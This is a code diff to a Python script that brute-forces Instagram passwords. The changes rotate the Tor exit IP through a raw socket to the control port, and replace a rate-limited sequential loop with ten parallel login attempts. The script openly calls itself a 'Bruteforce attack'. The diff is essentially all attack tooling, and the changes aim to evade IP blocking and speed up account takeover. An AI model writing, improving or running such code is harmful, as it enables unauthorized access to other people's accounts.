@@ -4,6 +4,7 @@ import sys
 from datetime import datetime
 from colorama import init, Fore, Style
 import threading
+import socket
 
 # Initialize colorama
 init(autoreset=True)
@@ -12,11 +13,13 @@ init(autoreset=True)
 def rotate_tor_ip():
     while True:
         try:
+            # Send the SIGNAL NEWNYM command to Tor via ControlPort (9051)
+            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+                s.connect(('127.0.0.1', 9051))
+                s.send(b'SIGNAL NEWNYM\n')
+                time.sleep(120)  # Wait for 2 minutes before rotating the IP again
             print(Fore.CYAN + "[*] Rotating Tor IP...")
-            # Send the "SIGNAL NEWNYM" command to Tor to rotate the IP
-            response = requests.get("http://127.0.0.1:9051", headers={"Authorization": "Tor"})
-            response.raise_for_status()  # Check for errors in the response
-            time.sleep(120)  # Wait for 2 minutes before rotating the IP again
+
         except Exception as e:
             print(Fore.RED + f"[-] Error rotating Tor IP: {e}")
             time.sleep(120)  # Wait for 2 minutes before retrying if there's an error
@@ -88,32 +91,18 @@ def main():
     rotation_thread.daemon = True  # Daemonize the thread so it ends with the main process
     rotation_thread.start()
 
-    for password in passwords:
-        try:
-            # Password attempt
-            print(Fore.YELLOW + f"[+] Trying: {password}", end=" | ", flush=True)
+    # Use ThreadPoolExecutor for parallel password attempts
+    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
+        futures = [executor.submit(instagram_login, username, password) for password in passwords]
 
-            if instagram_login(username, password):
-                print(Fore.GREEN + f"[+] Login successful for {username}:{password}")
+        for future in concurrent.futures.as_completed(futures):
+            if future.result():  # If login is successful
+                print(Fore.GREEN + f"[+] Login successful!")
                 break
             else:
-                print(Fore.RED + f"Status = [Fail]")  # Failed login status
-
-            time.sleep(1)  # Add a delay to avoid rate limiting
-
-        except requests.exceptions.RequestException as e:
-            print(Fore.RED + f"[-] Network error occurred: {e}")
-            time.sleep(30)  # Wait for 30 seconds before retrying
-        except KeyboardInterrupt:
-            print("\n[!] Bruteforce attack interrupted by user.")
-            sys.exit(0)
-        except Exception as e:
-            print(Fore.RED + f"[-] An unexpected error occurred: {e}")
-            time.sleep(10)  # Wait for 10 seconds before continuing
+                print(Fore.RED + f"Status = [Fail]")
 
     print(Fore.GREEN + "[*] Bruteforce attack completed.")
 
 if __name__ == "__main__":
-    main()
-    
-                    
+    main() 
